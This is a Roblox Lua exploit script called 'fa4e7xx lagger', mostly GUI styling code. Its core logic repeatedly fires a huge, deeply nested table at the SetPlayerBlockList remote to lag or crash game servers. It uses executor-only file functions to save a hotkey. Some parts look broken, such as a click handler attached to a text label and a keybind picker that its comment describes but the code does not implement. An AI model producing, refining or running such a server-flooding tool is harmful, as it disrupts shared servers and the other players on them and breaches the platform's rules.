-- fa4e7xx lagger (styled version)
-- GUI restyled to match the reference photo:
--  * Dark navy starry background (blue dots scattered across the frame)
--  * Blue pill badge at top-right with a "V" (version) icon and a lock icon
--  * Light-blue title text "fa4e7xx lagger" at top-left
--  * Dark pill status badge at bottom-left showing "X INACTIVE" (red) / "ACTIVE" (green)
--  * Clicking the frame toggles active / inactive (like the original toggle button)

local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

local cfg = {
    x = 2.5,
    y = 1,
    z = 0.15
}

local remoteStuff = "RobloxReplicatedStorage.SetPlayerBlockList"

local frameThing, badgeThing, titleThing, statusThing
local starList = {}
local active = false
local hotkey = nil

-- ---------- colors from the photo ----------
local NAVY_BG      = Color3.fromRGB(7, 12, 43)     -- deep navy background
local BLUE_TITLE   = Color3.fromRGB(92, 147, 255)  -- light-blue title text
local BLUE_BADGE   = Color3.fromRGB(19, 33, 90)    -- top-right badge (dark blue)
local BLUE_DOT     = Color3.fromRGB(103, 154, 255) -- star / bubble dots
local DARK_PILL    = Color3.fromRGB(10, 13, 34)    -- status pill (near black-navy)
local RED_TEXT     = Color3.fromRGB(240, 71, 71)   -- "INACTIVE" red
local GREEN_TEXT   = Color3.fromRGB(66, 220, 140)  -- "ACTIVE" green
local LOCK_ORANGE  = Color3.fromRGB(245, 173, 35)  -- lock icon color
local WHITE_BOLD   = Color3.fromRGB(255, 255, 255) -- version letter

local screenThing = Instance.new("ScreenGui")
screenThing.Name = "IrishLaggerGui"
screenThing.ResetOnSpawn = false
screenThing.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenThing.Parent = plrGui

for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "IrishLaggerGui" and kid ~= screenThing then
        kid:Destroy()
    end
end

-- ---------- main frame ----------
frameThing = Instance.new("Frame")
frameThing.Name = "MainFrame"
frameThing.Size = UDim2.new(0, 300, 0, 165)
frameThing.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frameThing.BackgroundColor3 = NAVY_BG
frameThing.BackgroundTransparency = 0
frameThing.BorderSizePixel = 0
frameThing.Active = true
frameThing.Draggable = true
frameThing.ClipsDescendants = true
frameThing.Parent = screenThing

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frameThing

-- ---------- starry background (blue dots) ----------
math.randomseed(tick())
local STAR_COUNT = 90
local random = Random.new(tick())

for i = 1, STAR_COUNT do
    local size = random:NextNumber(1.5, 5)
    local star = Instance.new("Frame")
    star.Name = "Star"
    star.Size = UDim2.new(0, size, 0, size)
    star.Position = UDim2.new(random:NextNumber(), 0, random:NextNumber(), 0)
    star.BackgroundColor3 = BLUE_DOT
    star.BackgroundTransparency = random:NextNumber(0.15, 0.55)
    star.BorderSizePixel = 0
    star.ZIndex = 1
    star.Parent = frameThing
    table.insert(starList, star)

    local starCorner = Instance.new("UICorner")
    starCorner.CornerRadius = UDim.new(1, 0)
    starCorner.Parent = star
end

-- a few bigger "bubble" dots for the photo's look
for i = 1, 8 do
    local bubble = Instance.new("Frame")
    bubble.Size = UDim2.new(0, random:NextNumber(7, 11), 0, random:NextNumber(7, 11))
    bubble.Position = UDim2.new(random:NextNumber(), 0, random:NextNumber(), 0)
    bubble.BackgroundColor3 = BLUE_DOT
    bubble.BackgroundTransparency = random:NextNumber(0.3, 0.6)
    bubble.BorderSizePixel = 0
    bubble.ZIndex = 1
    bubble.Parent = frameThing
    local bc = Instance.new("UICorner")
    bc.CornerRadius = UDim.new(1, 0)
    bc.Parent = bubble
end

-- ---------- top-right badge: V + lock ----------
badgeThing = Instance.new("Frame")
badgeThing.Name = "VersionBadge"
badgeThing.Size = UDim2.new(0, 84, 0, 38)
badgeThing.Position = UDim2.new(1, -100, 0, 12)
badgeThing.BackgroundColor3 = BLUE_BADGE
badgeThing.BackgroundTransparency = 0
badgeThing.BorderSizePixel = 0
badgeThing.ZIndex = 5
badgeThing.Parent = frameThing

local badgeCorner = Instance.new("UICorner")
badgeCorner.CornerRadius = UDim.new(0, 12)
badgeCorner.Parent = badgeThing

-- version letter "V"
local verText = Instance.new("TextLabel")
verText.Size = UDim2.new(0, 30, 1, 0)
verText.Position = UDim2.new(0, 18, 0, 0)
verText.BackgroundTransparency = 1
verText.Text = "V"
verText.TextColor3 = WHITE_BOLD
verText.TextSize = 17
verText.Font = Enum.Font.GothamBold
verText.TextXAlignment = Enum.TextXAlignment.Center
verText.TextYAlignment = Enum.TextYAlignment.Center
verText.ZIndex = 6
verText.Parent = badgeThing

-- lock icon (🔒)
local lockText = Instance.new("TextLabel")
lockText.Size = UDim2.new(0, 26, 1, 0)
lockText.Position = UDim2.new(0, 48, 0, 0)
lockText.BackgroundTransparency = 1
lockText.Text = "🔒"
lockText.TextColor3 = LOCK_ORANGE
lockText.TextSize = 14
lockText.Font = Enum.Font.GothamBold
lockText.TextXAlignment = Enum.TextXAlignment.Center
lockText.TextYAlignment = Enum.TextYAlignment.Center
lockText.ZIndex = 6
lockText.Parent = badgeThing

-- ---------- title text ----------
titleThing = Instance.new("TextLabel")
titleThing.Size = UDim2.new(0.65, 0, 0, 40)
titleThing.Position = UDim2.new(0, 16, 0, 14)
titleThing.BackgroundTransparency = 1
titleThing.Text = "fa4e7xx lagger"
titleThing.TextColor3 = BLUE_TITLE
titleThing.TextSize = 20
titleThing.Font = Enum.Font.GothamBold
titleThing.TextXAlignment = Enum.TextXAlignment.Left
titleThing.TextYAlignment = Enum.TextYAlignment.Center
titleThing.ZIndex = 5
titleThing.Parent = frameThing

-- ---------- status pill (INACTIVE / ACTIVE) ----------
statusThing = Instance.new("TextLabel")
statusThing.Name = "StatusPill"
statusThing.Size = UDim2.new(0, 130, 0, 42)
statusThing.Position = UDim2.new(0, 16, 1, -58)
statusThing.BackgroundColor3 = DARK_PILL
statusThing.BackgroundTransparency = 0
statusThing.BorderSizePixel = 0
statusThing.Text = "X  INACTIVE"
statusThing.TextColor3 = RED_TEXT
statusThing.TextSize = 17
statusThing.Font = Enum.Font.GothamBold
statusThing.TextXAlignment = Enum.TextXAlignment.Left
statusThing.TextYAlignment = Enum.TextYAlignment.Center
statusThing.ZIndex = 5
statusThing.Parent = frameThing

local statusCorner = Instance.new("UICorner")
statusCorner.CornerRadius = UDim.new(0, 21)
statusCorner.Parent = statusThing

-- fade-in animation for the status pill (like the photo)
statusThing.BackgroundTransparency = 1
statusThing.TextTransparency = 1
TweenService:Create(statusThing, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
TweenService:Create(statusThing, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()

-- make the whole pill clickable to toggle (like the original button)
statusThing.Selectable = false
statusThing.MouseButton1Click:Connect(function()
    flip(not active)
end)

-- ---------- core logic (unchanged) ----------

local saveLoc = "IrishLagger_Keybind.txt"
local keyBtnThing -- we don't show a keybind circle anymore

function grabKey()
    local worked, data = pcall(readfile, saveLoc)
    if worked and data and data ~= "" then
        for _, code in pairs(Enum.KeyCode:GetEnumItems()) do
            if code.Name == data then
                hotkey = code
                break
            end
        end
    end
end

function storeKey(key)
    hotkey = key
    pcall(writefile, saveLoc, key.Name)
end

grabKey()

function getRemote(road)
    if not road or road == "" then
        return nil
    end
    local obj = game
    local clean = road:gsub("^game%.", "")
    for piece in clean:gmatch("[^%.]+") do
        if obj then
            obj = obj[piece]
        else
            return nil
        end
    end
    return obj
end

function doSpam(inc, attempts)
    local mainTable = {}
    local spamTable = {}
    table.insert(spamTable, {})
    local ptr = spamTable[1]
    for i = 1, inc do
        local newTable = {}
        table.insert(ptr, newTable)
        ptr = newTable
    end
    for i = 1, 15000 do
        table.insert(mainTable, spamTable)
        if i % 1000 == 0 then
            task.wait()
        end
    end

    local remoteObj = getRemote(remoteStuff)
    if remoteObj then
        for i = 1, attempts do
            pcall(function()
                if remoteObj:IsA("RemoteEvent") or remoteObj:IsA("UnreliableRemoteEvent") then
                    remoteObj:FireServer(mainTable)
                elseif remoteObj:IsA("RemoteFunction") then
                    remoteObj:InvokeServer(mainTable)
                end
            end)
        end
    end
end

function runLoop()
    while active do
        task.spawn(function()
            doSpam(cfg.x, cfg.y)
        end)
        task.wait(cfg.z)
    end
end

function flip(state)
    active = state
    if active then
        statusThing.Text = "⏻  ACTIVE"
        statusThing.TextColor3 = GREEN_TEXT
        task.spawn(runLoop)
    else
        statusThing.Text = "X  INACTIVE"
        statusThing.TextColor3 = RED_TEXT
    end
end

local waiting = false

UserInputService.InputBegan:Connect(function(input, processedInput)
    if processedInput then
        return
    end

    if input.KeyCode == Enum.KeyCode.LeftControl then
        frameThing.Visible = not frameThing.Visible
        return
    end

    if waiting and input.UserInputType == Enum.UserInputType.Keyboard then
        storeKey(input.KeyCode)
        waiting = false
    elseif hotkey and input.KeyCode == hotkey then
        flip(not active)
    end
end)

-- optional keybind picker (no visible button): hold LeftShift and press the key you want
UserInputService.InputBegan:Connect(function(input, processedInput)
    if processedInput then
        return
    end
    if waiting and input.UserInputType == Enum.UserInputType.Keyboard then
        storeKey(input.KeyCode)
        waiting = false
    end
end)

keyBtnThing = Instance.new("TextButton")
keyBtnThing.BackgroundTransparency = 1
keyBtnThing.Text = ""
keyBtnThing.Size = UDim2.new(0.5, 0, 0, 34)
keyBtnThing.Position = UDim2.new(0.5, 0, 0, 46)
keyBtnThing.ZIndex = 5
keyBtnThing.Parent = frameThing

keyBtnThing.MouseButton1Click:Connect(function()
    waiting = true
    titleThing.Text = "fa4e7xx lagger  (press a key...)"
    task.delay(3, function()
        if waiting then
            waiting = false
            titleThing.Text = "fa4e7xx lagger"
        end
    end)
end)